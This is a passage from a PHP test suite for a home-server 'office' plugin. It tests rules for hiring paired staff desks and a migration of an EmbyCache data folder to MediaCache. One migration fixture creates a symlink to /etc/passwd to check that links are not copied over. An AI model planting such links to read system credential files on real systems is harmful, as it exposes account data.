        array_fill(0, 3, ['text' => 'hire', 'hires' => ['restore']]),
        array_map(fn ($k) => array_intersect_key($r[$k]['restore'] ?? [], ['text' => 1, 'hires' => 1]), ['colleague_here', 'colleague_declines', 'colleague_training']));
    hardeningRm($tmp);
}

/**
 * Jack Emby is an intern: he works only under Ms. Moverelli (2026-10-12, the owner's decision; desk.json "needs"): the
 * web side's staff rules (src/staff.php officeStaffNeeds()) — hired only with her or after her, she is let go only after
 * him, nothing written by a refusal; an unknown "needs" is none; the Team Lead's row (under node): «Hire together with
 * Ms. Moverelli», after her plain «Hire», she can't come — no button, said why; «Hire all» leaves him out then; the
 * strings ×5; his fit when she can't work here; her let-go refused while he is hired, the error names both by name.
 */
function testHireNeeds(): void
{
    $tmp = hardeningTmp('hire-needs');
    $web = function (string $code) use ($tmp): array {
        @mkdir("$tmp/plugin/src", 0700, true);
        foreach (glob(OFFICE_DIR . '/src/*.php') ?: [] as $f) {
            copy($f, "$tmp/plugin/src/" . basename($f));
        }
        @unlink("$tmp/plugin/desks");
        symlink(OFFICE_DIR . '/public/desks', "$tmp/plugin/desks");
        @unlink("$tmp/plugin/lang");
        symlink(OFFICE_DIR . '/public/lang', "$tmp/plugin/lang");
        @mkdir("$tmp/data/office", 0700, true);
        file_put_contents("$tmp/web.php", '<?php require ' . var_export("$tmp/plugin/src/bootstrap.php", true) . '; '
            . '$try = function (callable $f) { try { $f(); return "ok"; } catch (OfficeProblem $p) { return [$p->key, $p->status, $p->params]; } }; '
            . '$hired = fn () => array_keys(json_decode((string) @file_get_contents(OFFICE_DATA . "/office/staff.json"), true)["hired"] ?? []); ' . $code);
        $p = proc_open([PHP_BINARY, "$tmp/web.php"], [0 => ['file', '/dev/null', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null,
            ['OFFICE_DATA_DIR' => "$tmp/data", 'OFFICE_RUN_DIR' => TESTS_RUN_DIR, 'PATH' => getenv('PATH')]);
        $raw = (string) stream_get_contents($pipes[1]) . (string) stream_get_contents($pipes[2]);
        proc_close($p);
        return [json_decode($raw, true), $raw];
    };
    [$o, $raw] = $web('$out = [officeDesks()["jack"]["needs"], officeDesks()["jack"]["with"], officeDesks()["moverelli"]["needs"]];'
        . ' $out[] = $try(fn () => officeStaffAction("office.hire", ["desks" => ["jack"]])); $out[] = $hired();'
        . ' $out[] = $try(fn () => officeStaffAction("office.hire", ["desks" => ["jack", "moverelli"]])); $out[] = $hired();'
        . ' $out[] = $try(fn () => officeStaffAction("office.fire", ["desk" => "moverelli"])); $out[] = $hired();'
        . ' $out[] = $try(fn () => officeStaffAction("office.fire", ["desk" => "jack"]));'
        . ' $out[] = $try(fn () => officeStaffAction("office.fire", ["desk" => "moverelli"]));'
        . ' $out[] = $try(fn () => officeStaffAction("office.hire", ["desks" => ["jack"]])); $out[] = $hired();'
        . ' $out[] = $try(fn () => officeStaffAction("office.hire", ["desks" => ["moverelli"]]));'
        . ' $out[] = $try(fn () => officeStaffAction("office.hire", ["desks" => ["jack"]])); $out[] = $hired();'
        . ' echo json_encode($out);');
    if (!is_array($o)) {
        check('hire needs: the web side ran', false, $raw);
        hardeningRm($tmp);
        return;
    }
    same('hire needs: Jack Emby needs Ms. Moverelli (his with too), she needs nobody', ['moverelli', 'moverelli', null], array_slice($o, 0, 3));
    same('hire needs: Jack alone — refused (409, both named), nothing written', [['needs_colleague', 409, ['desk' => 'jack', 'with' => 'moverelli']], []], array_slice($o, 3, 2));
    same('hire needs: both in one request (in any order) — hired', ['ok', ['jack', 'moverelli']], array_slice($o, 5, 2));
    same('hire needs: letting her go while he is here — refused, he is named, both stay', [['needed_by', 409, ['desk' => 'moverelli', 'by' => 'jack']], ['jack', 'moverelli']], array_slice($o, 7, 2));
    same('hire needs: him first, then her — both go; him alone again — refused; her, then him — hired',
        ['ok', 'ok', ['needs_colleague', 409, ['desk' => 'jack', 'with' => 'moverelli']], [], 'ok', 'ok', ['moverelli', 'jack']], array_slice($o, 9, 7));
    // an unknown or own "needs" is none
    $fake = "$tmp/desks";
    foreach (['a' => 'b', 'b' => 'b', 'c' => 'ghost'] as $id => $need) {
        @mkdir("$fake/$id", 0700, true);
        file_put_contents("$fake/$id/desk.json", json_encode(['order' => 50, 'needs' => $need]));
        file_put_contents("$fake/$id/desk.js", '');
    }
    @unlink("$tmp/plugin/desks");
    $code = '<?php require ' . var_export("$tmp/plugin/src/bootstrap.php", true) . '; echo json_encode(array_map(fn ($d) => [$d["needs"], $d["with"]], officeDesks()));';
    file_put_contents("$tmp/web2.php", $code);
    symlink($fake, "$tmp/plugin/desks");
    $p = proc_open([PHP_BINARY, "$tmp/web2.php"], [0 => ['file', '/dev/null', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null,
        ['OFFICE_DATA_DIR' => "$tmp/data", 'OFFICE_RUN_DIR' => TESTS_RUN_DIR, 'PATH' => getenv('PATH')]);
    $raw = (string) stream_get_contents($pipes[1]) . (string) stream_get_contents($pipes[2]);
    proc_close($p);
    same('hire needs: only another desk that exists — itself, an unknown one: none', ['a' => ['b', 'b'], 'b' => [null, null], 'c' => [null, null]], json_decode($raw, true) ?? $raw);

    // the strings ×5: the Team Lead's line, the two refusals, her name as «with …» needs it
    foreach (['en', 'de', 'it', 'fr', 'es'] as $l) {
        $ct = json_decode((string) file_get_contents(OFFICE_WEB . "/desks/caretaker/lang/$l.json"), true) ?: [];
        $of = json_decode((string) file_get_contents(OFFICE_WEB . "/lang/$l.json"), true) ?: [];
        $mo = json_decode((string) file_get_contents(OFFICE_WEB . "/desks/moverelli/lang/$l.json"), true) ?: [];
        check("hire needs: $l — the row's line, the refusals with both names, her name for «with …»",
            str_contains((string) ($ct['needs_away'] ?? ''), '{with}') && str_contains((string) ($of['errors.needs_colleague'] ?? ''), '{with}')
            && str_contains((string) ($of['errors.needed_by'] ?? ''), '{by}') && ($mo['name_with'] ?? '') !== '');
    }
    $core = (string) file_get_contents(OFFICE_WEB . '/assets/core.js');
    check('hire needs: the refusals name the desks by their names (core.js errorText)', str_contains($core, "['in_training', 'needs_colleague', 'needed_by'].includes(error.key)"));
    $src = (string) file_get_contents(OFFICE_DIR . '/agent/desks/jack.php');
    check('hire needs: Jack\'s fit — Ms. Moverelli can\'t work here (Unraid too old), so he can\'t either',
        str_contains($src, "return fit(false, 'no_moverelli', ['name' => \$emby[0]['name']]);"));
    $mu = (string) file_get_contents(OFFICE_DIR . '/agent/desks/moverelli-unraid.php');
    check('hire needs: her own let-go refuses while Jack is hired (before anything is switched back)',
        strpos($mu, "throw new Problem('moverelli_jack_hired');") < strpos($mu, 'moverelliSetSchedule(null, $h);'));

    // the Team Lead's row, under node
    $node = trim((string) shell_exec('command -v node 2>/dev/null')) ?: (is_executable('/usr/local/bin/node') ? '/usr/local/bin/node' : '');
    if ($node === '') {
        check('hire needs: the candidate row - node is missing here - skipped', true);
        hardeningRm($tmp);
        return;
    }
    file_put_contents("$tmp/t.js", <<<'JS'
const fs = require('fs');
globalThis.OFFICE_DESK_TESTS = {};
globalThis.document = { currentScript: null };
const T = (k, p) => k + (p ? ' ' + JSON.stringify(p) : '');
const mk = (tag, cls, text) => { const n = { tag, className: cls || '', textContent: text || '', children: [], dataset: {}, disabled: false, type: '', onclick: null,
  appendChild(c) { this.children.push(c); return c; } }; n.classList = { add(c) { n.className += ' ' + c; } }; return n; };
const hired = [];
const desks = new Map();
globalThis.Office = { scope: () => T, t: T, el: mk, has: (k) => k === 'moverelli.name_with', fmt: {}, desk: () => {}, places: () => {}, placesFrom: () => {},
  sections: () => ({ places: () => [], mount: () => false, render() {}, active: () => '' }),
  place: (a, n) => { n.dataset.place = a; return n; }, avatar: () => mk('span'), agent: { running: true }, deskRank: () => 0, desks, config: {},
  hire: async (ids) => { hired.push(ids); return true; }, toast: () => {}, loadState: async () => {}, fireDialog: () => {} };
(0, eval)(fs.readFileSync(process.argv[2], 'utf8'));
const c = OFFICE_DESK_TESTS.caretaker;
const walk = (n, out = []) => { if (n && typeof n === 'object') { out.push(n); (n.children || []).forEach((x) => walk(x, out)); } return out; };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
(async () => {
  const out = {};
  const run = async (name, mo) => {
    desks.clear();
    desks.set('jack', { id: 'jack', order: 50, hired: false, with: 'moverelli', needs: 'moverelli' });
    desks.set('moverelli', { id: 'moverelli', order: 48, hired: mo.hired });
    c.setState({ staff: { jack: { hired: false, ok: true, why: 'yes' }, moverelli: mo } });
    const x = c.staff().find((s) => s.id === 'jack');
    const row = c.teamRow(x);
    const b = walk(row).find((n) => n.tag === 'button');
    const lines = walk(row).filter((n) => n.className === 'row-detail').map((n) => n.textContent);
    hired.length = 0;
    if (b) { await b.onclick(); await sleep(5); }
    out[name] = { text: b ? b.textContent : null, hires: hired[0] || null, lines };
  };
  await run('both', { hired: false, ok: true, why: 'yes' });
  await run('she_is_here', { hired: true, ok: true, why: 'yes' });
  await run('she_cant', { hired: false, ok: false, why: 'unraid_old' });
  console.log(JSON.stringify(out));
})().catch((e) => { console.log(JSON.stringify({ error: String(e && e.stack || e) })); });
JS);
    $raw = (string) shell_exec(escapeshellarg($node) . ' ' . escapeshellarg("$tmp/t.js") . ' ' . escapeshellarg(OFFICE_WEB . '/desks/caretaker/desk.js') . ' 2>&1');
    $r = json_decode($raw, true);
    if (!is_array($r) || isset($r['error'])) {
        check('hire needs: the candidate row ran under node', false, $raw);
        hardeningRm($tmp);
        return;
    }
    same('hire needs: she isn\'t here and would come — his button hires both, her first', ['hire_with {"name":"moverelli.name_with"}', ['moverelli', 'jack']],
        [$r['both']['text'] ?? null, $r['both']['hires'] ?? null]);
    same('hire needs: she is here — plain «Hire», him alone', ['hire', ['jack']], [$r['she_is_here']['text'] ?? null, $r['she_is_here']['hires'] ?? null]);
    same('hire needs: she can\'t come — no button, the row says why', [null, null, true],
        [array_key_exists('text', $r['she_cant'] ?? []) ? $r['she_cant']['text'] : 'x', array_key_exists('hires', $r['she_cant'] ?? []) ? $r['she_cant']['hires'] : 'x', in_array('needs_away {"name":"jack.name","with":"moverelli.name_with"}', $r['she_cant']['lines'] ?? [], true)]);
    $ct = (string) file_get_contents(OFFICE_WEB . '/desks/caretaker/desk.js');
    check('hire needs: «Hire all» leaves out who can\'t come without his colleague', str_contains($ct, 'const open = all.filter((s) => !s.hired && s.ok && !needsAway(s));'));
    hardeningRm($tmp);
}

/**
 * Jack Streamer's desk id `emby` → `jack` (2026-10-14, agent/lib/migrate.php officeMigrateJackId()): staff.json,
 * his state file, the Team Lead's notes — the copies before kept beside them, the second run changes nothing.
 */
/**
 * Step `mediacache` (1.65.0): Jack Streamer's EmbyCache folder (data/embycache) → MediaCache's (data/mediacache). The fixture
 * is shaped like a real 1.64.3 folder after one real run (Tower, 2026-10-15): settings with one server and no type, the list,
 * the origins, the result, the log and a rotated one, the lock, an import's copy, a clone of long ago; Ms. Moverelli's ini
 * and the gather's name the list (the data folder's and the share's form). An install without the folder stays untouched; a
 * run going defers it; done once, idempotent, the old folder kept; a pending step runs again from Jack's look.
 */
function testMigrateMediaCache(): void
{
    $ids = array_column(officeMigrateSteps(), 'id');
    check('mediacache: a step of the agent\'s migrations, the last one (1.65.0)', end($ids) === 'mediacache'
        && officeMigrateSteps()[count($ids) - 1]['version'] === '1.65.0');
    $tmp = hardeningTmp('migrate-mediacache');
    // a fresh install: nothing there, nothing made
    mkdir("$tmp/fresh", 0700);
    same('mediacache: an install that never set Jack up — untouched', ['nothing to change (Jack Streamer had no EmbyCache folder here)', false],
        [officeMigrateMediaCache("$tmp/fresh", '1.65.0'), file_exists("$tmp/fresh/mediacache")]);

    $d = "$tmp/data";
    $old = "$d/embycache";
    foreach (["$old/logs", "$old/app/.git", "$d/moverelli", "$d/gather"] as $x) {
        mkdir($x, 0700, true);
    }
    $settings = ['instances' => [['servername' => 'tower-emby', 'url' => 'http://192.168.7.111:8096', 'api_key' => 'abcdef0123456789abcdef0123456789',
        'path_mappings' => ['/mnt/media/Familienfilme' => '/mnt/user/media/Familienfilme', '/mnt/media/Privat' => '']]],
        'path_mappings' => [], 'libraries' => ['Familienfilme'], 'library_types' => ['Familienfilme' => 'movies'], 'valid_users' => [],
        'cache_path' => '/mnt/big', 'cache_budget' => '60G', 'max_resume_movies' => 10, 'return_to_origin' => true, 'fill_tool' => 'rsync',
        'cleanup_tool' => 'rsync', 'create_share_root' => false, 'some_future_key' => 7];
    file_put_contents("$old/embycache_settings.json", json_encode($settings, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    chmod("$old/embycache_settings.json", 0600);
    $list = "/mnt/big/media/Familienfilme/Ferien am See (2019)/Ferien am See (2019).mkv\n";
    file_put_contents("$old/embycache_exclude.txt", $list);
    file_put_contents("$old/embycache_origin.json", json_encode(['/mnt/big/media/Familienfilme/Ferien am See (2019)/Ferien am See (2019).mkv' => 'disk1']));
    file_put_contents("$old/embycache_exclude.txt.before-import-1700000000", "old\n");
    file_put_contents("$old/status.json", '{"mode":"run","result":"ok"}');
    file_put_contents("$old/office-history.json", '{"runs":[{"tool":"embycache","mode":"run","result":"ok"}]}');
    file_put_contents("$old/embycache.lock", '4242');
    file_put_contents("$old/.embycache_settings.trial.json", '{}');
    file_put_contents("$old/logs/embycache.log", "a line\n");
    file_put_contents("$old/logs/embycache.log.1", "an older line\n");
    file_put_contents("$old/app/.git/HEAD", "ref\n");
    symlink('/etc/passwd', "$old/a-link");
    touch("$old/embycache_origin.json", 1700000000);
    $ini = "[GLOBAL]\nglobal_excludes=$old/embycache_exclude.txt,/mnt/user/x.txt\n[media]\nexcludes=$old/embycache_exclude.txt\n";
    file_put_contents("$d/moverelli/smart_mover.ini", $ini);
    file_put_contents("$d/gather/consolidate.ini", "EXCLUDE_FILE='$old/embycache_exclude.txt'\nLOGFILE='$d/gather/consolidate.log'\n");

    // a run going: deferred, nothing touched
    $err = '';
    try {
        officeMigrateMediaCache($d, '1.65.0', ['running' => fn () => true]);
    } catch (RuntimeException $e) {
        $err = $e->getMessage();
    }
    same('mediacache: an EmbyCache run going — tried again later, nothing touched', ['an EmbyCache run is going — tried again once it has ended', false, true],
        [$err, file_exists("$d/mediacache"), is_dir($old)]);

    $said = officeMigrateMediaCache($d, '1.65.0', ['running' => fn () => false]);
    $new = "$d/mediacache";
    same('mediacache: said in the log', 'data/embycache → data/mediacache (7 files, 1 server typed emby; the list\'s path in moverelli/smart_mover.ini, '
        . 'gather/consolidate.ini; the old folder kept as embycache.before-1.65.0)', $said);
    $files = array_values(array_diff(scandir($new), ['.', '..']));
    same('mediacache: MediaCache\'s names, the rest as it was — no lock, no trial, no clone, no link, only the current log',
        ['logs', 'mediacache_exclude.txt', 'mediacache_exclude.txt.before-import-1700000000', 'mediacache_origin.json', 'mediacache_settings.json',
         'office-history.json', 'status.json'], $files);
    same('mediacache: the log as mediacache.log', ['mediacache.log'], array_values(array_diff(scandir("$new/logs"), ['.', '..'])));
    $s = json_decode((string) file_get_contents("$new/mediacache_settings.json"), true);
    same('mediacache: the server typed emby, key and mappings (the deliberate «not cached» too) and unknown keys kept',
        ['emby', 'abcdef0123456789abcdef0123456789', ['/mnt/media/Familienfilme' => '/mnt/user/media/Familienfilme', '/mnt/media/Privat' => ''], 7, '60G'],
        [$s['instances'][0]['type'] ?? null, $s['instances'][0]['api_key'] ?? null, $s['instances'][0]['path_mappings'] ?? null, $s['some_future_key'] ?? null,
         $s['cache_budget'] ?? null]);
    same('mediacache: «back to the disk they came from» gone even where it was on (2026-10-16); its old file kept, unused', [false, true],
        [array_key_exists('return_to_origin', $s), is_file("$new/mediacache_origin.json")]);
    same('mediacache: the settings stay root\'s alone (0600); the list and the origins as they were (time too)', [0600, $list, 1700000000],
        [fileperms("$new/mediacache_settings.json") & 0777, file_get_contents("$new/mediacache_exclude.txt"), filemtime("$new/mediacache_origin.json")]);
    same('mediacache: the old folder kept beside it, whole (the rotated log, the lock)', [false, true, true, true],
        [is_dir($old), is_file("$d/embycache.before-1.65.0/logs/embycache.log.1"), is_file("$d/embycache.before-1.65.0/embycache.lock"),
         is_file("$d/embycache.before-1.65.0/embycache_settings.json")]);
    same('mediacache: Ms. Moverelli\'s ini names the new list (both places), the one before kept beside it',
        ["[GLOBAL]\nglobal_excludes=$new/mediacache_exclude.txt,/mnt/user/x.txt\n[media]\nexcludes=$new/mediacache_exclude.txt\n", $ini],
        [file_get_contents("$d/moverelli/smart_mover.ini"), (string) @file_get_contents("$d/moverelli/smart_mover.ini.before-1.65.0")]);
    check('mediacache: the gather\'s ini names the new list', str_contains((string) file_get_contents("$d/gather/consolidate.ini"), "EXCLUDE_FILE='$new/mediacache_exclude.txt'"));
    same('mediacache: Jack reads it as set up (one Emby server, budget mode)', [true, 'emby', 'tower-emby'],
        [jackConfigured($r = jackReadSettings($new)), $r['instances'][0]['type'] ?? null, $r['instances'][0]['servername'] ?? null]);
    // MediaCache itself takes the migrated file (load_config, the paths not asked)
    $py = 'import sys; sys.path.insert(0, sys.argv[1]); import mediacache_lib as l; c = l.load_config(require_paths=False); '
        . 'i = c["instances"][0]; print(i["type"], sorted(i["_mappings"]), i["_skip"])';
    [$exit, $out, $err] = runEnv(['python3', '-c', $py, JACK_APP], ['MEDIACACHE_DIR' => $new, 'PYTHONDONTWRITEBYTECODE' => '1'], 30);
    same('mediacache: MediaCache loads the migrated settings', [0, "emby ['/mnt/media/Familienfilme'] ['/mnt/media/Privat']"], [$exit, trim($out) ?: trim($err)]);

    // again (a downgrade and back): nothing more; a crash after the copy: the old one only put aside
    same('mediacache: done once — again nothing', 'nothing to change (Jack Streamer had no EmbyCache folder here)', officeMigrateMediaCache($d, '1.65.0'));
    mkdir("$d/embycache");
    file_put_contents("$d/embycache/embycache_settings.json", '{}');
    same('mediacache: both there (a crash before the rename) — the old one put aside, the new one kept',
        ['data/mediacache is there already — data/embycache put aside as embycache.before-1.65.0-2', true, '60G'],
        [officeMigrateMediaCache($d, '1.65.0'), is_dir("$d/embycache.before-1.65.0-2"), json_decode((string) file_get_contents("$new/mediacache_settings.json"), true)['cache_budget']]);

    // pending (a run went at the start) → Jack's look runs it again, the marker says done
    $p = "$tmp/pending";
    mkdir("$p/embycache", 0700, true);
    file_put_contents("$p/embycache/embycache_settings.json", json_encode($settings));
    file_put_contents("$p/office.json", json_encode(['version' => '1.65.0', 'since' => 1, 'updated_from' => [], 'done' => ['marker'], 'pending' => ['mediacache']]));
    $logged = [];
    $steps = [['id' => 'mediacache', 'version' => '1.65.0', 'run' => fn (string $dir, string $to): string => officeMigrateMediaCache($dir, $to, ['running' => fn () => false])]];
    same('mediacache: a pending step runs again outside the start, the marker says done', [true, ['marker', 'mediacache'], [], true, false],
        [officeMigrateRetry('mediacache', $p, '1.65.0', $steps, function (string $l) use (&$logged) { $logged[] = $l; }),
         readJson("$p/office.json")['done'], readJson("$p/office.json")['pending'], is_file("$p/mediacache/mediacache_settings.json"),
         officeMigrateRetry('mediacache', $p, '1.65.0', $steps, fn () => null)]);
    check('mediacache: Jack\'s look and job ask for it while his old folder waits', str_contains($src = (string) file_get_contents(OFFICE_DIR . '/agent/desks/jack.php'),
        "officeMigrateRetry('mediacache')") && substr_count($src, 'jackMigratePending();') >= 2);
    hardeningRm($tmp);
}

function testMigrateJackId(): void
{
    require_once OFFICE_DIR . '/src/staff.php';
